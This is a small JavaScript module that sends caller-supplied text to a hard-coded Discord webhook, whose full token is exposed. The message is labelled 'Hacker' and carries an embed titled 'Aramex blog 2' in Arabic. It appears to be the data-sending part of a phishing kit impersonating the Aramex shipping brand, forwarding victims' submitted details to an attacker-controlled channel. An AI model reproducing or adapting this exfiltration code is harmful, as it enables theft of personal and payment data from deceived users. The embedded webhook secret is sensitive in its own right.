import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1325499546775715934/KsQBCCmkYlw5R-yvYFWmj9qVvd5WtWqOXNGRXyntqsNr8TSlyjNgHmxWwgwpdGdZa2ew",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
